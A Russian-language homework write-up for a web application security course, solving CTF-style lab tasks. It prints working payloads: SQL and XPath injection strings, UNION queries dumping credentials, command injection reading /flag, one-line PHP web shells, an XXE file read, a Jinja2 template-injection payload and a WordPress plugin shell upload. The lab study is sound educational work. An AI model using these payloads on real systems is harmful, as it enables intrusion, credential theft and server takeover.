# 4.2 Homework - [Lecture 4] - Application security

## SQL Injection
Здесь у нас форма авторизации, используем самый распрастраненный пейлоад для байпаса:
```
'OR 1=1; --
```
Можно предположить, что сырой запрос в БД выглядит так:
select * from Users where login = '' or 1=1; --'
Вставляем кавычку, внедряемся в контекст, далее пишем выражение которое возвращает True, закрываем запрос в SQL точкой запятой, концовку комментируем двумя тире.
Тем самым возвращается True и приложение пропускает нас, получаем флаг.
![](https://i.imgur.com/oMZR1gQ.png)

## Backup File
Админы забыли удалить файл, скорее всего нужно копать в дирсерч. Можно воспользоваться готовый фаззером директорий, например, Dirsearch :D
![](https://i.imgur.com/uDX6QGb.png)
Находим интересный файл, внутри дамп sql с кредами, залогинимся под админом
![](https://i.imgur.com/Ir5rgRl.png)
![](https://i.imgur.com/iX9ZPmR.png)

## LFI Injection
![](https://i.imgur.com/Izqx73r.png)
Мы видим что в строке запроса в параметре file передается нужный php файлик. Можно попробовать проэкслуатировать Path Traversal. Чтобы добраться до корня, используем ../
Спустились на 17 директорий, добрались до корня:![Uploading file..._eoudva6kf]()


## CMD Injection
Здесь есть форма ввода, можно попробовать поставить логическое или &&, в баше эту будет означать, что выполнится та команда, которая предполагается на бэке + наш RCE.
Я попробовал посмотреть корневой каталог с помощью
```
&& ls /
```
Увидел файл с флагом:![](https://i.imgur.com/PyFn7qz.png)
Далее прочитал его через
```
&& cat /flag
```
![](https://i.imgur.com/3UPHVU9.png)

## IDOR
Предполагается что нужно найти IDOR. Сразу в глаза бросается вкладка с продуктами, где htmlки вызываются по инкрементальному идентификатору
![](https://i.imgur.com/Jwp7UCp.png)
Можно попробовать пофаззить этот идентификатор. Уже на 6ом мы видим флаг:
![](https://i.imgur.com/TsKG2b9.png)

## Union SQL injection
У нас есть форма для ввода и отправки POST запросом UNION конструкций:
Первым делом можно узнать все базы данных:
```
' and 1 = 0 UNION SELECT 1,SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 3,1-- -
```
Выводится по одному значению, поэтому перебираем Limit 0,1 --> 1,1 -->2,1

![](https://i.imgur.com/5O3zH25.png)

Нужна БД называется users. Далее нужно найти все таблицы в этой БД:
```
' and 1 = 0 UNION SELECT 1,TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=database()LIMIT 1,1-- -
```
Здесь все тоже самое, в БД users лежит 3 таблицы: news, Flag, users
![](https://i.imgur.com/Fa6L8wc.png)
![](https://i.imgur.com/L46tS3D.png)
![](https://i.imgur.com/APLjY9d.png)

Теперь можно узнать колонки в интересующих нас таблицах:
В таблице Flag одна колонка flag
```
' and 1 = 0 UNION SELECT 1,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=database() AND TABLE_NAME='users'LIMIT 0,1-- -
```
![](https://i.imgur.com/25QWlDl.png)
В таблице users 5 колонок: 1) id 2)Login 3)Password 4)Name 5)Description
Теперь можно извлекать данные из этих колонок, из колонки flag:
```
' and 1 = 0 UNION SELECT 1,flag FROM Flag LIMIT 0,1-- -
```
![](https://i.imgur.com/CQPsB8E.png)

Но нам нужен пароль от админа, идем в таблицу users:
```
' and 1 = 0 UNION SELECT 1,Login FROM users LIMIT 1,1-- -
```
Видим что первый логин - админ, значит на той же позиции его пароль
![](https://i.imgur.com/IPydi8R.png)
```
' and 1 = 0 UNION SELECT 1,Password FROM users LIMIT 1,1-- -
```
![](https://i.imgur.com/ID6oVGC.png)

## File Upload
Тут необходимо залить файл картинку, например, jpeg, после чего мы видим путь, куда залился файл
![](https://i.imgur.com/brPJ76a.png)
![](https://i.imgur.com/e1XPxsy.png)
Нужен простой RCE скрипт для php, залить его также, получить Access Denied, но все равно посетить /pictures, в итоге мой скрипт:
```
<?php passthru($_GET['c']); ?>
```
Параметру С передаем команду, например ls /

![](https://i.imgur.com/tl7qFao.png)

Видими флаг

![](https://i.imgur.com/Ke3KYxh.png)

## XXE
Здесь нужно добавить внешнюю сущность через DTD
```
<!DOCTYPE foo [<!ENTITY a SYSTEM "file:///flag"> ]>
<creds>
<user>test&a;</user>
<pass>pass</pass>
</creds>
```
Получаем флаг: 
![](https://i.imgur.com/4dJRdB7.png)

## Hide file
В задании сказано найти скрытый файл, а в линухе такой файл начинается с точки.
Сходил я в robots.txt, нашел директорию /hide
![](https://i.imgur.com/6kQ8xqh.png)
Пошел в нее, но файла не вижу, потому что он скрыт, но к нему можно обратиться
![](https://i.imgur.com/rTDVg8u.png)
![](https://i.imgur.com/AyGVmbc.png)

## SSTI
![](https://i.imgur.com/yfW2vCD.png)

По табличке определил что шаблонизатор либо Jinja2 либо Twig, напоролся на exception

![](https://i.imgur.com/ER2I92H.png)

Понял что все таки Jinja2
Сходил на payload of the things, Нашел нужный Payload
```
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/flag').read() }}
```
![](https://i.imgur.com/prUmU1X.png)

## XPath Injection

Как и с sql, внедряемся через payload, только в login перед кавычкой пишем логин Admin
```
' or '1' = '1 
```
![](https://i.imgur.com/9rBQLLW.png)

## Basic Auth
Полез в гидру ломать пароль, оказалось все намного проще
![](https://i.imgur.com/Ycgs8To.png)
admin:qwerty
![](https://i.imgur.com/7e4lLUT.png)

## SSRF

![](https://i.imgur.com/tgJ2d5e.png)

В подсказске сказано поиграться с урлом, значит скорее всего с параметром в строке запроса.
Копал сначала в сторону файла, но нет:![](https://i.imgur.com/0sHseXR.png)

Через схему можно отправлять запросы, на 443 порту оказался флаг:

![](https://i.imgur.com/VLpDlU8.png)

## RCE

Здесь необходимо выполнить RCE через строку запроса, сначала я попробовал пофаззить, чтобы явно определить:

![](https://i.imgur.com/bOJBdEQ.png)

Смог вызвать print(). Еще у php есть eval, shell_exec - последний сработал:
```
echo shell_exec('cat /flag');
http://62.182.50.166:1362/index.php?page=echo shell_exec('cat /flag');
```

![](https://i.imgur.com/aolNXuM.png)


## CMS Hack

Нам нужно попасть в админку, я просканил через wpscan, плагинов уязвимых не нашел. Попробовал побрутить пароль:

![](https://i.imgur.com/wJmALRo.png)

Результат:

![](https://i.imgur.com/YqJuUJG.png)

Логинимся, видим что мы админ

![](https://i.imgur.com/Wot1ev4.png)

Здесь уже можно попробовать разные подходы, я выбрал LFI, через добавление нового плагина

![](https://i.imgur.com/kF5ERsB.png)

Идея в том, что скрипт должен упасть туда же, где лежит картинка для Media.
1) Грузим Плагин, выбрал я все тот же простой скрипт для php:
```
<?php system($_GET['cmd']); ?>
```
2) Идем в Media, смотрим где лежит картинка

![](https://i.imgur.com/amKTK1Z.png)

Идем туда, видим наш скрипт

![](https://i.imgur.com/8cQGO6Y.png)

Дальше все тем же способом, выполняем команду:

![](https://i.imgur.com/kA219wY.png)
